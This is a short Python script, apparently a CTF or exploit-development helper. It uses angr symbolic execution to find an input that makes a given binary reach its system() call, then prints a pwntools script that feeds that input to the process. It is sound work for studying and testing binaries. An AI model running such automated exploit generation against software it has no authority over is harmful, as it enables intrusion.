#!/usr/bin/env python

import angr
import claripy
import pwn
import argparse

parser = argparse.ArgumentParser(description="Select a filename.")
parser.add_argument("filename", type=str, help="The name of the file to process")
args = parser.parse_args()

# Load the binary for analysis.
proj = angr.Project(f'{args.filename}', auto_load_libs=False)

proj.loader

cfg = proj.analyses.CFGEmulated()
system_addr = [addr for addr, func in cfg.kb.functions.items() if 'system' == func.name and func.is_plt][0]
def system_check(state):
    if state.ip.args[0] == system_addr:
        return True
    return False

# Establish a state for solving
state = proj.factory.full_init_state()

# Create a simulation mamanger & find a path to the target.
simgr = proj.factory.simgr(state)

# Setup our target
simgr.explore(find=system_check)

pathcount = len(simgr.found)
print("# Length simgr.found: {}".format(pathcount))
if pathcount == 0:
    exit()

# Show the solution!
solution = simgr.found[0]
print(f'''
import pwn
p = pwn.process('{args.filename}')
p.send({solution.posix.dumps(0)})
print(p.recvall())
p.close()
''')
